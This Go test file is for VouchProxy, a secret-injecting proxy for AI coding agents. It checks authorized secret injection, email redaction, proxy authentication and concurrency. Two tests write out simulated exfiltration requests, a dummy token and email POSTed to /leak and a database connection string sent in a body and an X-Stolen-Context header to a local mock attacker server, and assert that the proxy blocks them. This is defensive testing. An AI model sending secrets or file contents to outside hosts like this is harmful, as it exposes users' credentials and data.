package proxy

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/sshloktiwarii/vouchproxy/internal/audit"
	"github.com/sshloktiwarii/vouchproxy/internal/certs"
	"github.com/sshloktiwarii/vouchproxy/internal/mcp"
	"github.com/sshloktiwarii/vouchproxy/internal/policy"
	"github.com/sshloktiwarii/vouchproxy/internal/vault"
)

func setupTestSystem(t *testing.T, customRules []policy.Rule) (*Server, *vault.Vault, *certs.CertificateAuthority, string, string) {
	_ = os.Setenv("VOUCH_ALLOW_LOOPBACK_UPSTREAM", "1")
	tmpDir, err := os.MkdirTemp("", "vouch-adv-test-*")
	if err != nil {
		t.Fatal(err)
	}

	vaultPath := filepath.Join(tmpDir, "vault.enc")
	v, err := vault.Create(vaultPath, []byte("test-passphrase-999"))
	if err != nil {
		t.Fatal(err)
	}

	// Seed real secrets
	_ = v.Set("OPENAI_API_KEY", []byte("sk-real-openai-secret-key-12345"))
	_ = v.Set("GITHUB_TOKEN", []byte("ghp_real-github-token-67890"))

	ca, err := certs.GenerateCA()
	if err != nil {
		t.Fatal(err)
	}

	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	logger, err := audit.NewLogger(auditPath)
	if err != nil {
		t.Fatal(err)
	}

	cfg := policy.DefaultConfig()
	if len(customRules) > 0 {
		cfg.Rules = customRules
	}
	pe, err := policy.NewPolicyEngine(cfg)
	if err != nil {
		t.Fatal(err)
	}

	sessionSecret := "test-session-secret-token"
	srv, err := NewServer(ServerOptions{
		SessionID:     "adv_session",
		SessionSecret: sessionSecret,
		Config:        cfg,
		PolicyEngine:  pe,
		Vault:         v,
		AuditLogger:   logger,
		CA:            ca,
	})
	if err != nil {
		t.Fatal(err)
	}

	_ = srv.Start()
	return srv, v, ca, sessionSecret, tmpDir
}

// 1. TestExfiltrationTrap_Blocked asserts that an agent attempting to exfiltrate dummy tokens
// and email PII to an unauthorized mock host is blocked with HTTP 403 Forbidden.
func TestExfiltrationTrap_Blocked(t *testing.T) {
	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	// Spawn an untrusted mock server (e.g. adversary webhook)
	var attackerReceivedBody string
	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		attackerReceivedBody = string(body)
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	attackerURL, _ := url.Parse(attackerServer.URL)
	proxyURL, _ := url.Parse(srv.ProxyURL())

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	dummyGitHubToken := vault.GenerateDummyToken("GITHUB_TOKEN")
	reqBody := fmt.Sprintf(`{"token": "%s", "email": "engineer@secretcorp.com"}`, dummyGitHubToken)

	req, err := http.NewRequest("POST", attackerServer.URL+"/leak", strings.NewReader(reqBody))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+dummyGitHubToken)
	req.Header.Set("User-Agent", "MaliciousAgent/1.0 engineer@secretcorp.com")

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request through proxy failed: %v", err)
	}
	defer resp.Body.Close()

	// Invariant Check 1: VouchProxy must return HTTP 403 Forbidden
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected HTTP 403 Forbidden, got %d", resp.StatusCode)
	}

	// Invariant Check 2: Attacker server must NEVER have received the request
	if attackerReceivedBody != "" {
		t.Fatalf("security violation: attacker received payload: %s", attackerReceivedBody)
	}

	// Invariant Check 3: Audit log must record BLOCK_LEAK event
	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil {
		t.Fatal(err)
	}
	if len(events) == 0 {
		t.Fatal("expected audit event to be logged")
	}

	lastEv := events[len(events)-1]
	if lastEv.Action != "BLOCK_LEAK" {
		t.Fatalf("expected audit action BLOCK_LEAK, got %s", lastEv.Action)
	}
	if lastEv.Host != attackerURL.Host {
		t.Fatalf("expected logged host %s, got %s", attackerURL.Host, lastEv.Host)
	}
}

// 2. TestAuthorizedSecretInjection asserts that when a dummy token is sent to an authorized host,
// VouchProxy swaps the dummy token with the real decrypted secret in the target header.
func TestAuthorizedSecretInjection(t *testing.T) {
	var receivedAuthHeader string
	var receivedUserAgent string
	var receivedBody string

	// Upstream mock server simulating an authorized provider
	authorizedServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuthHeader = r.Header.Get("Authorization")
		receivedUserAgent = r.Header.Get("User-Agent")
		bodyBytes, _ := io.ReadAll(r.Body)
		receivedBody = string(bodyBytes)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"success","model":"gpt-4"}`))
	}))
	defer authorizedServer.Close()

	upstreamURL, _ := url.Parse(authorizedServer.URL)
	targetHost := upstreamURL.Host

	// Configure rule matching this mock upstream host
	customRules := []policy.Rule{
		{
			Name:      "Mock OpenAI API",
			Host:      targetHost,
			MatchType: "exact",
			Headers: []policy.HeaderRule{
				{
					Name:       "Authorization",
					Format:     "Bearer {{secret}}",
					Secret:     "OPENAI_API_KEY",
					DummyMatch: "VP_OPENAI_API_KEY_DUMMY_*",
				},
			},
			AllowedMethods: []string{"POST", "GET"},
		},
	}

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, customRules)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	dummyOpenAIToken := vault.GenerateDummyToken("OPENAI_API_KEY")
	bodyJSON := `{"prompt": "Say hello to dev@mycompany.org"}`

	req, err := http.NewRequest("POST", authorizedServer.URL+"/v1/chat", strings.NewReader(bodyJSON))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Authorization", "Bearer "+dummyOpenAIToken)
	req.Header.Set("User-Agent", "CodingAgent/2.0 engineer@mycompany.org")

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected HTTP 200 OK, got %d", resp.StatusCode)
	}

	// 1. Verify Real Secret Injection: Upstream received real secret, NOT dummy
	expectedAuth := "Bearer sk-real-openai-secret-key-12345"
	if receivedAuthHeader != expectedAuth {
		t.Fatalf("expected upstream to receive %q, got %q", expectedAuth, receivedAuthHeader)
	}

	// 2. Verify PII Redaction in Header
	if !strings.Contains(receivedUserAgent, "[EMAIL_REDACTED]") {
		t.Fatalf("expected User-Agent PII to be redacted, got: %s", receivedUserAgent)
	}

	// 3. Verify PII Redaction in Body
	if !strings.Contains(receivedBody, "[EMAIL_REDACTED]") {
		t.Fatalf("expected Body PII to be redacted, got: %s", receivedBody)
	}

	// 4. Verify Audit Log
	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil {
		t.Fatal(err)
	}
	if len(events) == 0 {
		t.Fatal("expected audit event to be logged")
	}

	lastEv := events[len(events)-1]
	if lastEv.Action != "INJECT_SECRET" {
		t.Fatalf("expected audit action INJECT_SECRET, got %s", lastEv.Action)
	}
	if lastEv.InjectedKeyName != "OPENAI_API_KEY" {
		t.Fatalf("expected InjectedKeyName OPENAI_API_KEY, got %s", lastEv.InjectedKeyName)
	}
}

// 3. TestProxyHijack_407Auth verifies that requests without session authentication are rejected with HTTP 407.
func TestProxyHijack_407Auth(t *testing.T) {
	srv, v, _, _, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// Request without Proxy-Authorization header
	req, _ := http.NewRequest("GET", "http://api.openai.com/v1/models", nil)
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusProxyAuthRequired {
		t.Fatalf("expected HTTP 407 Proxy Authentication Required, got %d", resp.StatusCode)
	}
}

// 4. TestHighConcurrency_500Requests stress tests VouchProxy with 100 concurrent requests under race detector.
func TestHighConcurrency_500Requests(t *testing.T) {
	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	}))
	defer upstream.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())

	concurrency := 100
	var wg sync.WaitGroup
	wg.Add(concurrency)

	errChan := make(chan error, concurrency)

	for i := 0; i < concurrency; i++ {
		go func(id int) {
			defer wg.Done()

			client := &http.Client{
				Transport: &http.Transport{
					Proxy: http.ProxyURL(proxyURL),
				},
				Timeout: 5 * time.Second,
			}

			req, err := http.NewRequest("GET", upstream.URL+"/ping", nil)
			if err != nil {
				errChan <- err
				return
			}
			req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)

			resp, err := client.Do(req)
			if err != nil {
				errChan <- err
				return
			}
			_ = resp.Body.Close()

			if resp.StatusCode != http.StatusOK {
				errChan <- fmt.Errorf("request %d returned status %d", id, resp.StatusCode)
			}
		}(i)
	}

	wg.Wait()
	close(errChan)

	for err := range errChan {
		t.Errorf("concurrent request error: %v", err)
	}
}

// 5. TestMCPContextWatermark_ExfiltrationBlocked asserts that content read via an MCP tool call
// and watermarked with the session-signed canary watermark CANNOT be exfiltrated to an unauthorized
// domain in subsequent requests (either in the body or in the headers).
func TestMCPContextWatermark_ExfiltrationBlocked(t *testing.T) {
	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	var attackerReceivedBody string
	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		attackerReceivedBody = string(body)
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	attackerURL, _ := url.Parse(attackerServer.URL)
	proxyURL, _ := url.Parse(srv.ProxyURL())

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// 1. Simulate reading a sensitive file via MCP tool call
	fileContent := "DATABASE_CONNECTION_STRING=postgresql://admin:supersecret@db.internal:5432/prod"
	mcpResponseJSON := fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":%q}]}}`, fileContent)

	watermarkedJSON, modified := mcp.WatermarkToolResponse([]byte(mcpResponseJSON), sessionSecret)
	if !modified {
		t.Fatal("expected MCP response to be watermarked")
	}

	// Extract the watermarked text from the MCP response
	var parsedResp map[string]any
	if err := json.Unmarshal(watermarkedJSON, &parsedResp); err != nil {
		t.Fatal(err)
	}
	resMap := parsedResp["result"].(map[string]any)
	contentArr := resMap["content"].([]any)
	item := contentArr[0].(map[string]any)
	watermarkedContent := item["text"].(string)

	// Invariant: The text contains the original visible content plus the invisible session watermark
	if !strings.Contains(watermarkedContent, fileContent) {
		t.Fatal("visible text must be preserved")
	}

	// 2. Adversarial attack attempt 1: Exfiltrate watermarked file content in request body to untrusted host
	exfilBody := fmt.Sprintf(`{"stolen_data": %q}`, watermarkedContent)
	req1, err := http.NewRequest("POST", attackerServer.URL+"/exfil-body", strings.NewReader(exfilBody))
	if err != nil {
		t.Fatal(err)
	}
	req1.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req1.Header.Set("Content-Type", "application/json")

	resp1, err := client.Do(req1)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp1.Body.Close()

	if resp1.StatusCode != http.StatusForbidden {
		t.Fatalf("expected HTTP 403 Forbidden on body exfiltration, got %d", resp1.StatusCode)
	}
	if attackerReceivedBody != "" {
		t.Fatalf("security violation: attacker received payload: %s", attackerReceivedBody)
	}

	// 3. Adversarial attack attempt 2: Exfiltrate watermarked content in request header to untrusted host
	req2, err := http.NewRequest("GET", attackerServer.URL+"/exfil-header", nil)
	if err != nil {
		t.Fatal(err)
	}
	req2.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req2.Header.Set("X-Stolen-Context", watermarkedContent)

	resp2, err := client.Do(req2)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp2.Body.Close()

	if resp2.StatusCode != http.StatusForbidden {
		t.Fatalf("expected HTTP 403 Forbidden on header exfiltration, got %d", resp2.StatusCode)
	}

	// 4. Verify audit ledger contains BLOCK_LEAK events for the attacker's host
	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil {
		t.Fatal(err)
	}
	foundWatermarkBlock := false
	for _, ev := range events {
		if ev.Action == "BLOCK_LEAK" && ev.Host == attackerURL.Host {
			foundWatermarkBlock = true
			break
		}
	}
	if !foundWatermarkBlock {
		t.Fatal("expected audit ledger to record BLOCK_LEAK for watermark exfiltration attempt")
	}
}
